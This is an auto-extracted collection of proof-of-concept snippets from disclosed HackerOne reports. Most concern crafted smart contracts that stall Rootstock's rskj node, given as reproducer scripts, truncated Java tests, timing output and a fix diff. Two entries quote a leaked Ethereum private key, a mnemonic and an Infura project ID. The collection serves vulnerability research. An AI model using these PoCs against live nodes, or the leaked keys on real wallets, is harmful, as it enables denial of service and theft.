# Smart contract / blockchain — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #2412583 Crafted smart contract can take 8 minutes to execute due to bug in modexp precompile. — rootstocklabs — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2025/2412583.md` (https://hackerone.com/reports/2412583)

```
#!/bin/bash

wget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz
tar zxf openjdk-11.0.2_linux-x64_bin.tar.gz
export JAVA_HOME=$(realpath jdk-11.0.2/)
git clone --depth 1 https://github.com/rsksmart/rskj.git
cd rskj/
./configure.sh
echo """
package co.rsk.vm;

import org.ethereum.config.blockchain.upgrades.ActivationConfig;
import co.rsk.config.TestSystemProperties;
import co.rsk.config.VmConfig;
import org.ethereum.vm.*;
import org.ethereum.core.BlockFactory;
import org.ethereum.core.BlockTxSignatureCache;
import org.ethereum.core.ReceivedTxSignatureCache;
import org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;
import java.util.HashSet;
import org.ethereum.vm.program.Program;
import org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;
import javax.xml.bind.DatatypeConverter;
import org.junit.jupiter.api.Test;

public class Poc {
    @Test
    void testPoc() {
        TestSystemProperties config = new TestSystemProperties();
        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));
        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());
        VmConfig vmConfig = config.getVmConfig();
        ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();
        ActivationConfig.ForBlock activations = ActivationConfigsForTest.fingerroot500().forBlock(0);

        byte[] code = DatatypeConverter.parseHexBi
```

```
real    8m23.429s
user    0m3.147s
sys	0m0.265s
```

```
    @Test
    void testPoc() {
        TestSystemProperties config = new TestSystemProperties();
        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));
        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());
        VmConfig vmConfig = config.getVmConfig();
        ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();
        ActivationConfig.ForBlock activations = ActivationConfigsForTest.fingerroot500().forBlock(0);
```

## #2489843 Crafted smart contract can take 1.5 minutes to execute due to inefficient CODESIZE implementation — rootstocklabs — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2025/2489843.md` (https://hackerone.com/reports/2489843)

```
    protected void doCODESIZE() {
        if (computeGas) {
            if (op == OpCode.EXTCODESIZE) {
                gasCost = GasCost.EXT_CODE_SIZE;
            }
            spendOpCodeGas();
        }
        // EXECUTION PHASE
        DataWord codeLength;
        if (op == OpCode.CODESIZE) {
            codeLength = DataWord.valueOf(program.getCode().length); // during initialization it will return the initialization code size
```

```
wget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz
tar zxf openjdk-11.0.2_linux-x64_bin.tar.gz
export JAVA_HOME=$(realpath jdk-11.0.2/)
git clone --depth 1 https://github.com/rsksmart/rskj.git
cd rskj/
echo "task testJar(type: Jar) {" >>rskj-core/build.gradle
echo "    from sourceSets.test.output" >>rskj-core/build.gradle
echo "    classifier = 'tests'" >>rskj-core/build.gradle
echo "}" >>rskj-core/build.gradle
echo "assemble.dependsOn(testJar)" >>rskj-core/build.gradle
./configure.sh
# Build rskj
./gradlew assemble
# Construct reproducer
echo """
import co.rsk.config.TestSystemProperties;
import co.rsk.config.VmConfig;
import java.util.HashSet;
import javax.xml.bind.DatatypeConverter;
import org.ethereum.config.blockchain.upgrades.ActivationConfig;
import org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;
import org.ethereum.core.BlockFactory;
import org.ethereum.core.BlockTxSignatureCache;
import org.ethereum.core.ReceivedTxSignatureCache;
import org.ethereum.vm.*;
import org.ethereum.vm.program.Program;
import org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;

public class Poc {
    public static void main(String[] args) {
        TestSystemProperties config = new TestSystemProperties();
        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));
        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig()
```

```
diff --git a/rskj-core/src/main/java/org/ethereum/vm/VM.java b/rskj-core/src/main/java/org/ethereum/vm/VM.java
index 2365d38..88eb90d 100644
--- a/rskj-core/src/main/java/org/ethereum/vm/VM.java
+++ b/rskj-core/src/main/java/org/ethereum/vm/VM.java
@@ -775,7 +775,7 @@ public class VM {
         // EXECUTION PHASE
         DataWord codeLength;
         if (op == OpCode.CODESIZE) {
-            codeLength = DataWord.valueOf(program.getCode().length); // during initialization it will return the initialization code size
+            codeLength = DataWord.valueOf(program.getCodeLength()); // during initialization it will return the initialization code size
         } else {
             DataWord address = program.stackPop();
             codeLength = DataWord.valueOf(program.getCodeLengthAt(address));
diff --git a/rskj-core/src/main/java/org/ethereum/vm/program/Program.java b/rskj-core/src/main/java/org/ethereum/vm/program/Program.java
index 5a79952..35885d5 100644
--- a/rskj-core/src/main/java/org/ethereum/vm/program/Program.java
+++ b/rskj-core/src/main/java/org/ethereum/vm/program/Program.java
@@ -960,6 +960,10 @@ public class Program {
         return Arrays.copyOf(ops, ops.length);
     }
 
+    public int getCodeLength() {
+        return ops.length;
+    }
+
     public Keccak256 getCodeHashAt(RskAddress addr, boolean standard) {
         if(standard) {
             return invoke.getRepository().getCodeHashStandard(addr);
```

## #2559404 Crafted smart contract can take ~23 seconds to execute due to immense error string construction — rootstocklabs — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2025/2559404.md` (https://hackerone.com/reports/2559404)

```
String errorMessage = String.format("Invalid data given: %s.", ByteUtil.toHexString(data));
```

```
String errorMessage = String.format("Invalid data given: %s.", "");
```

```
wget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz
tar zxf openjdk-11.0.2_linux-x64_bin.tar.gz
export JAVA_HOME=$(realpath jdk-11.0.2/)
git clone --depth 1 https://github.com/rsksmart/rskj.git
cd rskj/
echo "task testJar(type: Jar) {" >>rskj-core/build.gradle
echo "    from sourceSets.test.output" >>rskj-core/build.gradle
echo "    classifier = 'tests'" >>rskj-core/build.gradle
echo "}" >>rskj-core/build.gradle
echo "assemble.dependsOn(testJar)" >>rskj-core/build.gradle
./configure.sh

# Disable logging
echo """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<configuration>
    <root level=\"OFF\">
    </root>
</configuration>""" >rskj-core/src/test/resources/logback.xml

# Build rskj
./gradlew assemble

# Construct reproducer
echo """
import co.rsk.config.TestSystemProperties;
import co.rsk.config.VmConfig;
import java.util.HashSet;
import javax.xml.bind.DatatypeConverter;
import co.rsk.test.builders.AccountBuilder;
import co.rsk.test.builders.TransactionBuilder;
import org.ethereum.config.blockchain.upgrades.ActivationConfig;
import org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;
import org.ethereum.core.BlockFactory;
import org.ethereum.core.BlockTxSignatureCache;
import org.ethereum.core.ReceivedTxSignatureCache;
import org.ethereum.vm.*;
import org.ethereum.vm.program.Program;
import org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;
import org.ethereum.core.Account;
import org.ethereum.core.Transaction;
import java.
```

## #1133670  ETHEREUM_PRIVATE_KEY leaked via Open Github Repository — sifchain — - — Cleartext Storage of Sensitive Information
Source: `hackerone/reports/2021/1133670.md` (https://hackerone.com/reports/1133670)

```
          OPERATOR: "0x627306090abaB3A6e1400e9345bC60c78a8BEf57"
          PAUSER: "0x627306090abaB3A6e1400e9345bC60c78a8BEf57"
          OWNER: "0x627306090abaB3A6e1400e9345bC60c78a8BEf57"
          MNEMONIC: "candy maple cake sugar pudding cream honey rich smooth crumble sweet treat"
          INFURA_PROJECT_ID: "JFSH7439sjsdtqTM23Dz"
          INITIAL_VALIDATOR_ADDRESSES: "0x627306090abaB3A6e1400e9345bC60c78a8BEf57,0xf17f52151EbEF6C7334FAD080c5704D77216b732"
          INITIAL_VALIDATOR_POWERS: "50,50"
          MAINNET_GAS_PRICE: 200000000000
          EROWAN_ADDRESS: "0x0d8cc4b8d15D4c3eF1d70af0071376fb26B5669b"
          ==ETHEREUM_PRIVATE_KEY: "c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3"==
```

## #1183269 ETHEREUM_PRIVATE_KEY leaked  — sifchain — - — Cleartext Storage of Sensitive Information
Source: `hackerone/reports/2021/1183269.md` (https://hackerone.com/reports/1183269)

```
ETHEREUM_PRIVATE_KEY="c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3"
```

